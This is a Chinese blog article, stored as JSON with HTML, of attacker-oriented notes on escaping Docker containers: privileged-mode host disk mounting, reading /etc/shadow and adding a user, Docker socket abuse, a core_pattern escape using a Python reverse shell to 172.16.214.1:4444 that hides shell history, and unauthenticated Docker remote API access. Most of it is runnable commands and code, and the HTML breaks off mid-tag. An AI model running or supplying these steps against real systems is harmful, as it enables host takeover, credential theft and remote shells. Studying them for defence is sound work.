{"title":"云原生-docker","uid":"c1542731ca718f81298fabe69ac4f53f","slug":"云攻防-云原生-docker","date":"2025-05-17T08:28:23.756Z","updated":"2025-05-17T08:37:23.312Z","comments":true,"path":"api/articles/云攻防-云原生-docker.json","cover":"https://myhaoblog.oss-cn-beijing.aliyuncs.com/blog%20%E5%9B%BE%E7%89%87/e6d0930a-5ea5-4a58-9282-8a97feff4efa.jpg","content":"<h1 id=\"云原生-docker\"><a href=\"#云原生-docker\" class=\"headerlink\" title=\"云原生-docker\"></a>云原生-docker</h1><p>拿到权限：判断是否为容器</p>\n<p><a href=\"https://blog.csdn.net/qq_23936389/article/details/131486643\">https://blog.csdn.net/qq_23936389/article/details/131486643</a></p>\n<p>三种安全容器逃逸：</p>\n<ul>\n<li>特权模式启动导致（不安全启动 适用于 java jsp 高权限无需提权 还要提权才能逃<br>逸）</li>\n<li>危险挂载启动导致（危险启动 适用于 java jsp 高权限无需提权 还要提权才能逃逸）<br>-docker 自身 &amp; 系统漏洞（软件漏洞和系统漏洞 都可用）<br><a href=\"https://wiki.teamssix.com/cloudnative/\">https://wiki.teamssix.com/cloudnative/</a></li>\n</ul>\n<h2 id=\"容器逃逸-特权模式\"><a href=\"#容器逃逸-特权模式\" class=\"headerlink\" title=\"容器逃逸 - 特权模式\"></a>容器逃逸 - 特权模式</h2><p><a href=\"https://wiki.teamssix.com/CloudNative/Docker/docker-privileged-escape.html\">https://wiki.teamssix.com/CloudNative/Docker/docker-privileged-escape.html</a></p>\n<p>启动 docker 容器：</p>\n<div class=\"language-shell\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">shell</span><pre class=\"shiki dracula-soft\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #62E884\">docker</span><span style=\"color: #F6F6F4\"> </span><span style=\"color: #E7EE98\">run</span><span style=\"color: #F6F6F4\"> </span><span style=\"color: #BF9EEE\">--rm</span><span style=\"color: #F6F6F4\"> </span><span style=\"color: #BF9EEE\">--privileged=true</span><span style=\"color: #F6F6F4\"> </span><span style=\"color: #BF9EEE\">-it</span><span style=\"color: #F6F6F4\"> </span><span style=\"color: #E7EE98\">alpine</span><span style=\"color: #F6F6F4\">  </span><span style=\"color: #E7EE98\">//启用--privileged=</span><span style=\"color: #BF9EEE\">true</span><span style=\"color: #E7EE98\">，container内的root拥有真正的root权限，可能让攻击者利用此进行容器逃逸</span></span></code></pre></div><p>判断是否为容器环境：</p>\n<div class=\"language-shell\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">shell</span><pre class=\"shiki dracula-soft\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #62E884\">cat</span><span style=\"color: #F6F6F4\"> </span><span style=\"color: #E7EE98\">/proc/1/cgroup</span><span style=\"color: #F6F6F4\"> </span><span style=\"color: #F286C4\">|</span><span style=\"color: #F6F6F4\"> </span><span style=\"color: #62E884\">grep</span><span style=\"color: #F6F6F4\"> </span><span style=\"color: #BF9EEE\">-qi</span><span style=\"color: #F6F6F4\"> </span><span style=\"color: #E7EE98\">docker</span><span style=\"color: #F6F6F4\"> &amp;&amp; </span><span style=\"color: #97E1F1\">echo</span><span style=\"color: #F6F6F4\"> </span><span style=\"color: #DEE492\">&quot;</span><span style=\"color: #E7EE98\">Is Docker</span><span style=\"color: #DEE492\">&quot;</span><span style=\"color: #F6F6F4\"> </span><span style=\"color: #F286C4\">||</span><span style=\"color: #F6F6F4\"> </span><span style=\"color: #97E1F1\">echo</span><span style=\"color: #F6F6F4\"> </span><span style=\"color: #DEE492\">&quot;</span><span style=\"color: #E7EE98\">Not Docker</span><span style=\"color: #DEE492\">&quot;</span></span></code></pre></div><p>如果返回 Is Docker，说明当前是 Docker 容器环境，反之亦然。</p>\n<p>判断特权模式：</p>\n<div class=\"language-shell\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">shell</span><pre class=\"shiki dracula-soft\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #62E884\">cat</span><span style=\"color: #F6F6F4\"> </span><span style=\"color: #E7EE98\">/proc/self/status</span><span style=\"color: #F6F6F4\"> </span><span style=\"color: #F286C4\">|</span><span style=\"color: #F6F6F4\"> </span><span style=\"color: #62E884\">grep</span><span style=\"color: #F6F6F4\"> </span><span style=\"color: #BF9EEE\">-qi</span><span style=\"color: #F6F6F4\"> </span><span style=\"color: #DEE492\">&quot;</span><span style=\"color: #E7EE98\">0000003fffffffff</span><span style=\"color: #DEE492\">&quot;</span><span style=\"color: #F6F6F4\"> &amp;&amp; </span><span style=\"color: #97E1F1\">echo</span><span style=\"color: #F6F6F4\"> </span><span style=\"color: #DEE492\">&quot;</span><span style=\"color: #E7EE98\">Is privileged mode</span><span style=\"color: #DEE492\">&quot;</span><span style=\"color: #F6F6F4\"> </span><span style=\"color: #F286C4\">||</span><span style=\"color: #F6F6F4\"> </span><span style=\"color: #97E1F1\">echo</span><span style=\"color: #F6F6F4\"> </span><span style=\"color: #DEE492\">&quot;</span><span style=\"color: #E7EE98\">Not privileged mode</span><span style=\"color: #DEE492\">&quot;</span></span>\n<span class=\"line\"><span style=\"color: #62E884\">或者</span></span>\n<span class=\"line\"><span style=\"color: #62E884\">cat</span><span style=\"color: #F6F6F4\"> </span><span style=\"color: #E7EE98\">/proc/self/status</span><span style=\"color: #F6F6F4\"> </span><span style=\"color: #F286C4\">|</span><span style=\"color: #F6F6F4\"> </span><span style=\"color: #62E884\">grep</span><span style=\"color: #F6F6F4\"> </span><span style=\"color: #E7EE98\">CapEff</span><span style=\"color: #F6F6F4\"> </span></span></code></pre></div><p>在容器内部执行下面的命令，从而判断容器是不是特权模式，如果是以特权模式启动的话，CapEff 对应的掩码值应该为 0000003fffffffff 或者是 0000001fffffffff</p>\n<p>方法一：</p>\n<p>查看挂载磁盘设备：</p>\n<div class=\"language-shell\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">shell</span><pre class=\"shiki dracula-soft\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #62E884\">fdisk</span><span style=\"color: #F6F6F4\"> </span><span style=\"color: #BF9EEE\">-l</span></span></code></pre></div><p>在容器内部执行以下命令，将宿主机文件挂载到 &#x2F;test 目录下：</p>\n<div class=\"language-shell\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">shell</span><pre class=\"shiki dracula-soft\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #62E884\">mkdir</span><span style=\"color: #F6F6F4\"> </span><span style=\"color: #E7EE98\">/test</span><span style=\"color: #F6F6F4\"> &amp;&amp; </span><span style=\"color: #62E884\">mount</span><span style=\"color: #F6F6F4\"> </span><span style=\"color: #E7EE98\">/dev/sda1</span><span style=\"color: #F6F6F4\"> </span><span style=\"color: #E7EE98\">/test</span></span></code></pre></div><p>尝试访问宿主机 shadow 文件，可以看到正常访问</p>\n<div class=\"language-shell\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">shell</span><pre class=\"shiki dracula-soft\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #62E884\">cat</span><span style=\"color: #F6F6F4\"> </span><span style=\"color: #E7EE98\">/test/etc/shadow</span></span></code></pre></div><p>方法二</p>\n<div class=\"language-shell\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">shell</span><pre class=\"shiki dracula-soft\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #62E884\">mount</span><span style=\"color: #F6F6F4\"> </span><span style=\"color: #E7EE98\">/dev/sda1</span><span style=\"color: #F6F6F4\"> </span><span style=\"color: #E7EE98\">/mnt</span></span>\n<span class=\"line\"><span style=\"color: #62E884\">chroot</span><span style=\"color: #F6F6F4\"> </span><span style=\"color: #E7EE98\">/mnt</span><span style=\"color: #F6F6F4\"> </span><span style=\"color: #E7EE98\">adduser</span><span style=\"color: #F6F6F4\"> </span><span style=\"color: #E7EE98\">john</span></span></code></pre></div><p>通过新添加的用户登录</p>\n<h2 id=\"容器逃逸-挂载-逃逸\"><a href=\"#容器逃逸-挂载-逃逸\" class=\"headerlink\" title=\"容器逃逸 - 挂载 逃逸\"></a>容器逃逸 - 挂载 逃逸</h2><p><a href=\"https://wiki.teamssix.com/CloudNative/Docker/docker-procfs-escape.html\">https://wiki.teamssix.com/CloudNative/Docker/docker-procfs-escape.html</a></p>\n<p>启动容器：</p>\n<div class=\"language-shell\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">shell</span><pre class=\"shiki dracula-soft\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #62E884\">docker</span><span style=\"color: #F6F6F4\"> </span><span style=\"color: #E7EE98\">run</span><span style=\"color: #F6F6F4\"> </span><span style=\"color: #BF9EEE\">-it</span><span style=\"color: #F6F6F4\"> </span><span style=\"color: #BF9EEE\">-v</span><span style=\"color: #F6F6F4\"> </span><span style=\"color: #E7EE98\">/proc/sys/kernel/core_pattern:/host/proc/sys/kernel/core_pattern</span><span style=\"color: #F6F6F4\"> </span><span style=\"color: #E7EE98\">ubuntu</span><span style=\"color: #F6F6F4\"> </span><span style=\"color: #E7EE98\">//procfs</span></span>\n<span class=\"line\"><span style=\"color: #62E884\">docker</span><span style=\"color: #F6F6F4\"> </span><span style=\"color: #E7EE98\">run</span><span style=\"color: #F6F6F4\"> </span><span style=\"color: #BF9EEE\">-itd</span><span style=\"color: #F6F6F4\"> </span><span style=\"color: #BF9EEE\">--name</span><span style=\"color: #F6F6F4\"> </span><span style=\"color: #E7EE98\">with_docker_sock</span><span style=\"color: #F6F6F4\"> </span><span style=\"color: #BF9EEE\">-v</span><span style=\"color: #F6F6F4\"> </span><span style=\"color: #E7EE98\">/var/run/docker.sock:/var/run/docker.sock</span><span style=\"color: #F6F6F4\"> </span><span style=\"color: #E7EE98\">ubuntu</span><span style=\"color: #F6F6F4\"> </span><span style=\"color: #E7EE98\">//Socket</span></span></code></pre></div><h2 id=\"挂载-Docker-Socket-逃逸-：\"><a href=\"#挂载-Docker-Socket-逃逸-：\" class=\"headerlink\" title=\"挂载 Docker Socket 逃逸 ：\"></a>挂载 Docker Socket 逃逸 ：</h2><p>执行以下命令，如果返回 Docker Socket is mounted. 说明当前挂载了 Docker Socket</p>\n<div class=\"language-shell\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">shell</span><pre class=\"shiki dracula-soft\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #62E884\">ls</span><span style=\"color: #F6F6F4\"> </span><span style=\"color: #E7EE98\">/var/run/</span><span style=\"color: #F6F6F4\"> </span><span style=\"color: #F286C4\">|</span><span style=\"color: #F6F6F4\"> </span><span style=\"color: #62E884\">grep</span><span style=\"color: #F6F6F4\"> </span><span style=\"color: #BF9EEE\">-qi</span><span style=\"color: #F6F6F4\"> </span><span style=\"color: #E7EE98\">docker.sock</span><span style=\"color: #F6F6F4\"> &amp;&amp; </span><span style=\"color: #97E1F1\">echo</span><span style=\"color: #F6F6F4\"> </span><span style=\"color: #DEE492\">&quot;</span><span style=\"color: #E7EE98\">Docker Socket is mounted.</span><span style=\"color: #DEE492\">&quot;</span><span style=\"color: #F6F6F4\"> </span><span style=\"color: #F286C4\">||</span><span style=\"color: #F6F6F4\"> </span><span style=\"color: #97E1F1\">echo</span><span style=\"color: #F6F6F4\"> </span><span style=\"color: #DEE492\">&quot;</span><span style=\"color: #E7EE98\">Docker Socket is not mounted.</span><span style=\"color: #DEE492\">&quot;</span></span>\n<span class=\"line\"><span style=\"color: #62E884\">ls</span><span style=\"color: #F6F6F4\"> </span><span style=\"color: #BF9EEE\">-lah</span><span style=\"color: #F6F6F4\"> </span><span style=\"color: #E7EE98\">/var/run/docker.sock</span></span></code></pre></div><p>在容器内部创建一个新的容器，并将宿主机目录挂载到新的容器内部</p>\n<div class=\"language-shell\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">shell</span><pre class=\"shiki dracula-soft\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #62E884\">docker</span><span style=\"color: #F6F6F4\"> </span><span style=\"color: #E7EE98\">run</span><span style=\"color: #F6F6F4\"> </span><span style=\"color: #BF9EEE\">-it</span><span style=\"color: #F6F6F4\"> </span><span style=\"color: #BF9EEE\">-v</span><span style=\"color: #F6F6F4\"> </span><span style=\"color: #E7EE98\">/:/host</span><span style=\"color: #F6F6F4\"> </span><span style=\"color: #E7EE98\">ubuntu</span><span style=\"color: #F6F6F4\"> </span><span style=\"color: #E7EE98\">/bin/bash</span></span></code></pre></div><p>在新的容器内执行 chroot，将根目录切换到挂载到宿主机的根目录</p>\n<div class=\"language-shell\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">shell</span><pre class=\"shiki dracula-soft\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #62E884\">chroot</span><span style=\"color: #F6F6F4\"> </span><span style=\"color: #E7EE98\">/host</span></span></code></pre></div><h2 id=\"挂载-procfs-逃逸-：\"><a href=\"#挂载-procfs-逃逸-：\" class=\"headerlink\" title=\"挂载 procfs 逃逸 ：\"></a>挂载 procfs 逃逸 ：</h2><p>执行以下命令，如果返回 Procfs is mounted. 说明当前挂载了 procfs</p>\n<div class=\"language-shell\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">shell</span><pre class=\"shiki dracula-soft\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #62E884\">find</span><span style=\"color: #F6F6F4\"> </span><span style=\"color: #E7EE98\">/</span><span style=\"color: #F6F6F4\"> </span><span style=\"color: #BF9EEE\">-name</span><span style=\"color: #F6F6F4\"> </span><span style=\"color: #E7EE98\">core_pattern</span><span style=\"color: #F6F6F4\"> </span><span style=\"color: #F286C4\">2&gt;</span><span style=\"color: #E7EE98\">/dev/null</span><span style=\"color: #F6F6F4\"> </span><span style=\"color: #F286C4\">|</span><span style=\"color: #F6F6F4\"> </span><span style=\"color: #62E884\">wc</span><span style=\"color: #F6F6F4\"> </span><span style=\"color: #BF9EEE\">-l</span><span style=\"color: #F6F6F4\"> </span><span style=\"color: #F286C4\">|</span><span style=\"color: #F6F6F4\"> </span><span style=\"color: #62E884\">grep</span><span style=\"color: #F6F6F4\"> </span><span style=\"color: #BF9EEE\">-q</span><span style=\"color: #F6F6F4\"> </span><span style=\"color: #BF9EEE\">2</span><span style=\"color: #F6F6F4\"> &amp;&amp; </span><span style=\"color: #97E1F1\">echo</span><span style=\"color: #F6F6F4\"> </span><span style=\"color: #DEE492\">&quot;</span><span style=\"color: #E7EE98\">Procfs is mounted.</span><span style=\"color: #DEE492\">&quot;</span><span style=\"color: #F6F6F4\"> </span><span style=\"color: #F286C4\">||</span><span style=\"color: #F6F6F4\"> </span><span style=\"color: #97E1F1\">echo</span><span style=\"color: #F6F6F4\"> </span><span style=\"color: #DEE492\">&quot;</span><span style=\"color: #E7EE98\">Procfs is not mounted.</span><span style=\"color: #DEE492\">&quot;</span></span></code></pre></div><p>如果找到两个 core_pattern 文件，那可能就是挂载了宿主机的 procfs</p>\n<div class=\"language-shell\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">shell</span><pre class=\"shiki dracula-soft\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #62E884\">find</span><span style=\"color: #F6F6F4\"> </span><span style=\"color: #E7EE98\">/</span><span style=\"color: #F6F6F4\"> </span><span style=\"color: #BF9EEE\">-name</span><span style=\"color: #F6F6F4\"> </span><span style=\"color: #E7EE98\">core_pattern</span></span></code></pre></div><p>找到当前容器在宿主机下的绝对路径</p>\n<div class=\"language-shell\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">shell</span><pre class=\"shiki dracula-soft\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #62E884\">cat</span><span style=\"color: #F6F6F4\"> </span><span style=\"color: #E7EE98\">/proc/mounts</span><span style=\"color: #F6F6F4\"> </span><span style=\"color: #F286C4\">|</span><span style=\"color: #F6F6F4\"> </span><span style=\"color: #62E884\">xargs</span><span style=\"color: #F6F6F4\"> </span><span style=\"color: #BF9EEE\">-d</span><span style=\"color: #F6F6F4\"> </span><span style=\"color: #DEE492\">&#39;</span><span style=\"color: #E7EE98\">,</span><span style=\"color: #DEE492\">&#39;</span><span style=\"color: #F6F6F4\"> </span><span style=\"color: #BF9EEE\">-n</span><span style=\"color: #F6F6F4\"> </span><span style=\"color: #BF9EEE\">1</span><span style=\"color: #F6F6F4\"> </span><span style=\"color: #F286C4\">|</span><span style=\"color: #F6F6F4\"> </span><span style=\"color: #62E884\">grep</span><span style=\"color: #F6F6F4\"> </span><span style=\"color: #E7EE98\">workdir</span></span>\n<span class=\"line\"><span style=\"color: #62E884\">//为绝对路/var/lib/docker/overlay2/5717cb9154218ec49579ae338cd1c236694d6a377d61fd6d17e11e49d1b1baad/merged</span></span></code></pre></div><p>安装 vim 和 gcc</p>\n<div class=\"language-shell\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">shell</span><pre class=\"shiki dracula-soft\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #62E884\">apt-get</span><span style=\"color: #F6F6F4\"> </span><span style=\"color: #E7EE98\">update</span><span style=\"color: #F6F6F4\"> </span><span style=\"color: #BF9EEE\">-y</span><span style=\"color: #F6F6F4\"> &amp;&amp; </span><span style=\"color: #62E884\">apt-get</span><span style=\"color: #F6F6F4\"> </span><span style=\"color: #E7EE98\">install</span><span style=\"color: #F6F6F4\"> </span><span style=\"color: #E7EE98\">vim</span><span style=\"color: #F6F6F4\"> </span><span style=\"color: #E7EE98\">gcc</span><span style=\"color: #F6F6F4\"> </span><span style=\"color: #BF9EEE\">-y</span></span>\n<span class=\"line\"><span style=\"color: #62E884\">vim</span><span style=\"color: #F6F6F4\"> </span><span style=\"color: #E7EE98\">/tmp/.t.py</span></span></code></pre></div><p>创建一个反弹 Shell 的 py 脚本</p>\n<div class=\"language-shell\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">shell</span><pre class=\"shiki dracula-soft\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #7B7F8B\">#!/usr/bin/python3</span></span>\n<span class=\"line\"><span style=\"color: #62E884\">import</span><span style=\"color: #F6F6F4\">  </span><span style=\"color: #E7EE98\">os</span></span>\n<span class=\"line\"><span style=\"color: #62E884\">import</span><span style=\"color: #F6F6F4\"> </span><span style=\"color: #E7EE98\">pty</span></span>\n<span class=\"line\"><span style=\"color: #62E884\">import</span><span style=\"color: #F6F6F4\"> </span><span style=\"color: #E7EE98\">socket</span></span>\n<span class=\"line\"><span style=\"color: #62E884\">lhost</span><span style=\"color: #F6F6F4\"> </span><span style=\"color: #E7EE98\">=</span><span style=\"color: #F6F6F4\"> </span><span style=\"color: #DEE492\">&quot;</span><span style=\"color: #E7EE98\">172.16.214.1</span><span style=\"color: #DEE492\">&quot;</span></span>\n<span class=\"line\"><span style=\"color: #62E884\">lport</span><span style=\"color: #F6F6F4\"> </span><span style=\"color: #E7EE98\">=</span><span style=\"color: #F6F6F4\"> </span><span style=\"color: #BF9EEE\">4444</span></span>\n<span class=\"line\"><span style=\"color: #62E884\">def</span><span style=\"color: #F6F6F4\"> </span><span style=\"color: #E7EE98\">main</span><span style=\"color: #F6F6F4\">()</span><span style=\"color: #E7EE98\">:</span></span>\n<span class=\"line\"><span style=\"color: #F6F6F4\">   </span><span style=\"color: #62E884\">s</span><span style=\"color: #F6F6F4\"> </span><span style=\"color: #E7EE98\">=</span><span style=\"color: #F6F6F4\"> </span><span style=\"color: #E7EE98\">socket.socket</span><span style=\"color: #F6F6F4\">(</span><span style=\"color: #62E884\">socket.AF_INET,</span><span style=\"color: #F6F6F4\"> </span><span style=\"color: #E7EE98\">socket.SOCK_STREAM</span><span style=\"color: #F6F6F4\">)</span></span>\n<span class=\"line\"><span style=\"color: #F6F6F4\">   </span><span style=\"color: #62E884\">s.connect((lhost,</span><span style=\"color: #F6F6F4\"> </span><span style=\"color: #E7EE98\">lport</span><span style=\"color: #F6F6F4\">))</span></span>\n<span class=\"line\"><span style=\"color: #F6F6F4\">   </span><span style=\"color: #62E884\">os.dup2(s.fileno(</span><span style=\"color: #F6F6F4\">), 0)</span></span>\n<span class=\"line\"><span style=\"color: #F6F6F4\">   </span><span style=\"color: #62E884\">os.dup2(s.fileno(</span><span style=\"color: #F6F6F4\">), 1)</span></span>\n<span class=\"line\"><span style=\"color: #F6F6F4\">   </span><span style=\"color: #62E884\">os.dup2(s.fileno(</span><span style=\"color: #F6F6F4\">), 2)</span></span>\n<span class=\"line\"><span style=\"color: #F6F6F4\">   </span><span style=\"color: #62E884\">os.putenv(</span><span style=\"color: #62E884\">&quot;HISTFILE&quot;</span><span style=\"color: #62E884\">,</span><span style=\"color: #F6F6F4\"> </span><span style=\"color: #DEE492\">&#39;</span><span style=\"color: #E7EE98\">/dev/null</span><span style=\"color: #DEE492\">&#39;</span><span style=\"color: #F6F6F4\">)</span></span>\n<span class=\"line\"><span style=\"color: #F6F6F4\">   </span><span style=\"color: #62E884\">pty.spawn(</span><span style=\"color: #62E884\">&quot;/bin/bash&quot;</span><span style=\"color: #F6F6F4\">)</span></span>\n<span class=\"line\"><span style=\"color: #F6F6F4\">   </span><span style=\"color: #7B7F8B\"># os.remove(&#39;/tmp/.t.py&#39;)</span></span>\n<span class=\"line\"><span style=\"color: #F6F6F4\">   </span><span style=\"color: #62E884\">s.close</span><span style=\"color: #F6F6F4\">()</span></span>\n<span class=\"line\"><span style=\"color: #F6F6F4\">if __name__ == &quot;__main__&quot;:</span></span>\n<span class=\"line\"><span style=\"color: #F6F6F4\">   main()</span></span></code></pre></div><p>给 Shell 赋予执行权限</p>\n<div class=\"language-shell\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">shell</span><pre class=\"shiki dracula-soft\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #62E884\">chmod</span><span style=\"color: #F6F6F4\"> </span><span style=\"color: #BF9EEE\">777</span><span style=\"color: #F6F6F4\"> </span><span style=\"color: #E7EE98\">.t.py</span></span></code></pre></div><p>写入反弹 shell 到目标的 proc 目录下</p>\n<div class=\"language-shell\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">shell</span><pre class=\"shiki dracula-soft\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #97E1F1\">echo</span><span style=\"color: #F6F6F4\"> </span><span style=\"color: #BF9EEE\">-e</span><span style=\"color: #F6F6F4\"> </span><span style=\"color: #DEE492\">&quot;</span><span style=\"color: #E7EE98\">|/var/lib/docker/overlay2/5717cb9154218ec49579ae338cd1c236694d6a377d61fd6d17e11e49d1b1baad/merged/tmp/.t.py \\rcore    </span><span style=\"color: #DEE492\">&quot;</span><span style=\"color: #F6F6F4\"> </span><span style=\"color: #F286C4\">&gt;</span><span style=\"color: #F6F6F4\">  </span><span style=\"color: #E7EE98\">/host/proc/sys/kernel/core_pattern</span></span></code></pre></div><p>在攻击主机上开启一个监听，然后在容器里运行一个可以崩溃的程序</p>\n<div class=\"language-shell\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">shell</span><pre class=\"shiki dracula-soft\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #62E884\">vim</span><span style=\"color: #F6F6F4\"> </span><span style=\"color: #E7EE98\">t.c</span></span>\n<span class=\"line\"><span style=\"color: #7B7F8B\">#include&lt;stdio.h&gt;</span></span>\n<span class=\"line\"><span style=\"color: #62E884\">int</span><span style=\"color: #F6F6F4\"> </span><span style=\"color: #E7EE98\">main</span><span style=\"color: #F6F6F4\">(</span><span style=\"color: #62E884\">void</span><span style=\"color: #F6F6F4\">)  </span><span style=\"color: #E7EE98\">&#123;</span></span>\n<span class=\"line\"><span style=\"color: #F6F6F4\">   </span><span style=\"color: #62E884\">int</span><span style=\"color: #F6F6F4\"> </span><span style=\"color: #BF9EEE; font-style: italic\">*</span><span style=\"color: #E7EE98\">a</span><span style=\"color: #F6F6F4\">  </span><span style=\"color: #E7EE98\">=</span><span style=\"color: #F6F6F4\"> </span><span style=\"color: #E7EE98\">NULL</span><span style=\"color: #F6F6F4\">;</span></span>\n<span class=\"line\"><span style=\"color: #F6F6F4\">   </span><span style=\"color: #62E884\">*a</span><span style=\"color: #F6F6F4\"> </span><span style=\"color: #E7EE98\">=</span><span style=\"color: #F6F6F4\"> </span><span style=\"color: #BF9EEE\">1</span><span style=\"color: #F6F6F4\">;</span></span>\n<span class=\"line\"><span style=\"color: #F6F6F4\">   </span><span style=\"color: #F286C4\">return</span><span style=\"color: #F6F6F4\"> </span><span style=\"color: #BF9EEE\">0</span><span style=\"color: #F6F6F4\">;</span></span>\n<span class=\"line\"><span style=\"color: #F6F6F4\">&#125;</span></span>\n<span class=\"line\"><span style=\"color: #62E884\">gcc</span><span style=\"color: #F6F6F4\"> </span><span style=\"color: #E7EE98\">t.c</span><span style=\"color: #F6F6F4\"> </span><span style=\"color: #BF9EEE\">-o</span><span style=\"color: #F6F6F4\"> </span><span style=\"color: #E7EE98\">t</span></span>\n<span class=\"line\"><span style=\"color: #62E884\">./t</span></span></code></pre></div><h2 id=\"Docker-远程-API-未授权访问逃逸\"><a href=\"#Docker-远程-API-未授权访问逃逸\" class=\"headerlink\" title=\"Docker 远程 API 未授权访问逃逸\"></a>Docker 远程 API 未授权访问逃逸</h2><p>docker remote api 可以执行 docker 命令，docker 守护进程监听在 0.0.0.0，可直接调用 API 来操作 docker</p>\n<p>将 docker 守护进程监听在 0.0.0.0</p>\n<div class=\"language-shell\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">shell</span><pre class=\"shiki dracula-soft\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #62E884\">dockerd</span><span style=\"color: #F6F6F4\"> </span><span style=\"color: #BF9EEE\">-H</span><span style=\"color: #F6F6F4\"> </span><span style=\"color: #E7EE98\">unix:///var/run/docker.sock</span><span style=\"color: #F6F6F4\"> </span><span style=\"color: #BF9EEE\">-H</span><span style=\"color: #F6F6F4\"> </span><span style=\"color: #BF9EEE\">0.0</span><span style=\"color: #E7EE98\">.0.0:2375</span></span></code></pre></div><p>检测：</p>\n<div class=\"language-shell\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">shell</span><pre class=\"shiki dracula-soft\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #BF9EEE\">IP</span><span style=\"color: #F286C4\">=</span><span style=\"color: #E7EE98\">`</span><span style=\"color: #62E884\">hostname</span><span style=\"color: #E7EE98\"> </span><span style=\"color: #BF9EEE\">-i</span><span style=\"color: #E7EE98\"> </span><span style=\"color: #F286C4\">|</span><span style=\"color: #E7EE98\"> </span><span style=\"color: #62E884\">awk</span><span style=\"color: #E7EE98\"> </span><span style=\"color: #BF9EEE\">-F.</span><span style=\"color: #E7EE98\"> </span><span style=\"color: #DEE492\">&#39;</span><span style=\"color: #E7EE98\">&#123;print $1 &quot;.&quot; $2 &quot;.&quot; $3 &quot;.1&quot;&#125;</span><span style=\"color: #DEE492\">&#39;</span><span style=\"color: #E7EE98\"> `</span><span style=\"color: #F6F6F4\"> &amp;&amp; </span><span style=\"color: #62E884\">wget</span><span style=\"color: #F6F6F4\"> </span><span style=\"color: #E7EE98\">http://</span><span style=\"color: #BF9EEE\">$IP</span><span style=\"color: #E7EE98\">:2375</span></span></code></pre></div><p>如果返回 404 说明存在</p>\n<p>列出容器信息</p>\n<div class=\"language-shell\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">shell</span><pre class=\"shiki dracula-soft\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #62E884\">curl</span><span style=\"color: #F6F6F4\"> </span><span style=\"color: #E7EE98\">http://</span><span style=\"color: #F286C4\">&lt;</span><span style=\"color: #E7EE98\">targe</span><span style=\"color: #F6F6F4\">t</span><span style=\"color: #F286C4\">&gt;</span><span style=\"color: #E7EE98\">:2375/containers/json</span></span></code></pre></div><p>查看容器</p>\n<div class=\"language-shell\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">shell</span><pre class=\"shiki dracula-soft\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #62E884\">docker</span><span style=\"color: #F6F6F4\"> </span><span style=\"color: #BF9EEE\">-H</span><span style=\"color: #F6F6F4\"> </span><span style=\"color: #E7EE98\">tcp://</span><span style=\"color: #F286C4\">&lt;</span><span style=\"color: #E7EE98\">targe</span><span style=\"color: #F6F6F4\">t</span><span style=\"color: #F286C4\">&gt;</span><span style=\"color: #E7EE98\">:2375</span><span style=\"color: #F6F6F4\"> </span><span style=\"color: #E7EE98\">ps</span><span style=\"color: #F6F6F4\"> </span><span style=\"color: #BF9EEE\">-a</span></span></code></pre></div><p>新运行一个容器，挂载点设置为服务器的根目录挂载至 &#x2F;mnt 目录下。</p>\n<div class=\"language-shell\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">shell</span><pre class=\"shiki dracula-soft\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span 